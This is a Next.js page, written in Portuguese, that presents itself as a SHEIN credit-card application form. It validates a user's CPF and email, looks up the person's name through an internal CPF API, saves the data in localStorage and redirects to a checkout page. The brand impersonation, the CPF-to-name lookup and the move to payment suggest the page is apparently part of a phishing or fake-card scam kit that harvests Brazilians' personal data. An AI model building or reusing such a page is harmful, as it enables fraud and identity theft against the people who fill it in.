"use client"

import type React from "react"

import { useState } from "react"
import { useRouter } from "next/navigation"
import { usePageTracking, useTracking } from "@/hooks/use-tracking"

// Função para formatar CPF
const formatCPF = (value: string) => {
  const numbers = value.replace(/\D/g, "")

  if (numbers.length <= 3) {
    return numbers
  } else if (numbers.length <= 6) {
    return `${numbers.slice(0, 3)}.${numbers.slice(3)}`
  } else if (numbers.length <= 9) {
    return `${numbers.slice(0, 3)}.${numbers.slice(3, 6)}.${numbers.slice(6)}`
  } else {
    return `${numbers.slice(0, 3)}.${numbers.slice(3, 6)}.${numbers.slice(6, 9)}-${numbers.slice(9, 11)}`
  }
}

// Função para validar CPF
const validateCPF = (cpf: string) => {
  const numbers = cpf.replace(/\D/g, "")

  if (numbers.length !== 11) {
    return false
  }

  if (/^(\d)\1{10}$/.test(numbers)) {
    return false
  }

  let sum = 0
  for (let i = 0; i < 9; i++) {
    sum += Number.parseInt(numbers[i]) * (10 - i)
  }
  let remainder = sum % 11
  const digit1 = remainder < 2 ? 0 : 11 - remainder

  if (Number.parseInt(numbers[9]) !== digit1) {
    return false
  }

  sum = 0
  for (let i = 0; i < 10; i++) {
    sum += Number.parseInt(numbers[i]) * (11 - i)
  }
  remainder = sum % 11
  const digit2 = remainder < 2 ? 0 : 11 - remainder

  if (Number.parseInt(numbers[10]) !== digit2) {
    return false
  }

  return true
}

// Função para construir URL com parâmetros
const buildCheckoutUrl = (baseUrl: string, params: Record<string, string>) => {
  const url = new URL(baseUrl, window.location.origin)
  Object.entries(params).forEach(([key, value]) => {
    if (value) {
      url.searchParams.set(key, value)
    }
  })
  return url.toString()
}

export default function FormPage() {
  const router = useRouter()
  const { trackFormSubmit } = useTracking()

  usePageTracking("form")

  const [formData, setFormData] = useState({
    cpf: "",
    email: "",
  })

  const [errors, setErrors] = useState({
    cpf: "",
    email: "",
    api: "",
  })

  const [isLoading, setIsLoading] = useState(false)

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { id, value } = e.target

    if (id === "cpf") {
      const formattedCpf = formatCPF(value)
      setFormData((prev) => ({
        ...prev,
        [id]: formattedCpf,
      }))

      const numbers = formattedCpf.replace(/\D/g, "")
      if (numbers.length === 11) {
        if (validateCPF(formattedCpf)) {
          setErrors((prev) => ({ ...prev, cpf: "" }))
        } else {
          setErrors((prev) => ({ ...prev, cpf: "CPF inválido" }))
        }
      } else {
        setErrors((prev) => ({ ...prev, cpf: "" }))
      }
    } else {
      setFormData((prev) => ({
        ...prev,
        [id]: value,
      }))
    }

    setErrors((prev) => ({ ...prev, [id]: "", api: "" }))
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    setErrors({ cpf: "", email: "", api: "" })

    try {
      // Validação do CPF
      if (!validateCPF(formData.cpf)) {
        setErrors((prev) => ({ ...prev, cpf: "CPF inválido" }))
        trackFormSubmit("card_application", false)
        setIsLoading(false)
        return
      }

      // Validação do email
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
      if (!emailRegex.test(formData.email)) {
        setErrors((prev) => ({ ...prev, email: "Email inválido" }))
        trackFormSubmit("card_application", false)
        setIsLoading(false)
        return
      }

      console.log("Consultando CPF:", formData.cpf)

      // Consulta via API interna
      const response = await fetch("/api/cpf", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          cpf: formData.cpf,
        }),
      })

      const result = await response.json()
      console.log("Resultado da consulta:", result)

      if (!response.ok) {
        throw new Error(result.error || `Erro na consulta: ${response.status}`)
      }

      if (!result.success || !result.data) {
        throw new Error("Dados não encontrados para este CPF")
      }

      const cpfData = result.data
      console.log("Dados do CPF:", cpfData)

      // Verifica se tem nome
      if (!cpfData.nome) {
        throw new Error("Nome não encontrado para este CPF")
      }

      // Salva os dados no localStorage
      localStorage.setItem("cpfConsultaData", JSON.stringify(cpfData))
      localStorage.setItem("userEmail", formData.email)
      localStorage.setItem("userCpf", formData.cpf)
      localStorage.setItem("cardholderName", cpfData.nome)

      // Salva dados para checkout - CPF e Email
      const checkoutData = {
        document: formData.cpf.replace(/\D/g, ""), // Remove formatação do CPF
        email: formData.email,
        name: cpfData.nome,
      }
      localStorage.setItem("checkoutData", JSON.stringify(checkoutData))

      // Constrói URL inicial com CPF
      const initialParams = {
        document: checkoutData.document,
      }
      const checkoutUrl = buildCheckoutUrl("/checkout", initialParams)
      localStorage.setItem("checkoutUrl", checkoutUrl)

      trackFormSubmit("card_application", true)
      router.push("/form/success")
    } catch (error) {
      console.error("Erro na consulta:", error)

      let errorMessage = "Erro ao consultar CPF: "

      if (error.message.includes("não encontrado")) {
        errorMessage += "CPF não encontrado na base de dados."
      } else if (error.message.includes("inválido")) {
        errorMessage += "CPF inválido."
      } else {
        errorMessage += error.message
      }

      setErrors((prev) => ({
        ...prev,
        api: errorMessage,
      }))
      trackFormSubmit("card_application", false)
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className="min-h-full bg-gray-50 flex flex-col">
      <div className="flex-1 flex items-center justify-center p-4 py-8">
        <div className="bg-white rounded-lg shadow-md p-6 w-full max-w-md">
          <h1 className="text-xl font-bold mb-6 text-center">Solicite seu cartão SHEIN</h1>

          <form className="space-y-4" onSubmit={handleSubmit}>
            <div>
              <label htmlFor="cpf" className="block text-sm font-medium mb-2">
                CPF
              </label>
              <input
                type="text"
                id="cpf"
                value={formData.cpf}
                onChange={handleChange}
                className={`w-full p-3 border rounded-md text-base focus:ring-2 focus:ring-black focus:border-transparent ${
                  errors.cpf ? "border-red-500 focus:ring-red-500" : ""
                }`}
                placeholder="000.000.000-00"
                maxLength={14}
                required
                disabled={isLoading}
              />
              {errors.cpf && <p className="text-red-500 text-xs mt-1">{errors.cpf}</p>}
            </div>

            <div>
              <label htmlFor="email" className="block text-sm font-medium mb-2">
                E-mail
              </label>
              <input
                type="email"
                id="email"
                value={formData.email}
                onChange={handleChange}
                className={`w-full p-3 border rounded-md text-base focus:ring-2 focus:ring-black focus:border-transparent ${
                  errors.email ? "border-red-500 focus:ring-red-500" : ""
                }`}
                placeholder="seu@email.com"
                required
                disabled={isLoading}
              />
              {errors.email && <p className="text-red-500 text-xs mt-1">{errors.email}</p>}
            </div>

            {errors.api && (
              <div className="bg-red-50 border border-red-200 rounded-md p-3">
                <p className="text-red-600 text-sm">{errors.api}</p>
              </div>
            )}

            <div className="pt-4">
              <button
                type="submit"
                disabled={isLoading}
                className="w-full bg-black hover:bg-black/80 text-white font-bold py-3 px-4 rounded-md transition text-base disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center"
              >
                {isLoading ? (
                  <>
                    <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>
                    Consultando CPF...
                  </>
                ) : (
                  "SOLICITAR CARTÃO"
                )}
              </button>
            </div>

            <p className="text-xs text-gray-500 text-center mt-4 leading-relaxed">
              Ao continuar, você concorda com nossos Termos de Uso e Política de Privacidade.
            </p>
          </form>
        </div>
      </div>
    </div>
  )
}
